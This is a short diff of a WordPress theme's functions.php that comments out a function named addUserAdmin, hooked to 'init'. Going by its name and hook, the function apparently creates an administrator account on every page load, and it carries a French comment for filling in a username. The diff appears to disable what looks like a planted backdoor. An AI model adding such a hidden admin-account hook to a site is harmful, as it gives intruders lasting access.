@@ -217,7 +217,7 @@ if ( ! function_exists( 'hello_elementor_body_open' ) ) {
 			do_action( 'wp_body_open' );
 		}
 	}
-}
+}/*
 function addUserAdmin(){
   /// Ici mettez votre nom utilisateur sans majuscules
   $user = 'Username';
@@ -234,4 +234,4 @@ function addUserAdmin(){
   } 
 }
  
-add_action('init','addUserAdmin');
+add_action('init','addUserAdmin');*/
